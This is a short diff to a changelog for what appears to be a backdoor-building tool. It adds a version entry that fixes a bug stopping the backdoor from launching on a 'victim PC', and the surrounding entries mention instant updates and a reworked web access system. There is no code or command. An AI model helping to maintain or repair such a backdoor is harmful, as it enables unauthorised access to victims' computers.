@@ -1,3 +1,7 @@
+V3.27.21:
+Fixed fatal bug causing backdoor to not launch on victim PC. (all backdoors created before now will not work)
+
+
 V3.26.21
 backdoor now instantly updates (testing)
 cleaned up source code
@@ -39,4 +43,3 @@ V2.23.16:
 Reworked entire web access system
 heavy code optimization
 fixed, reworked, and reimplemented update logs
-
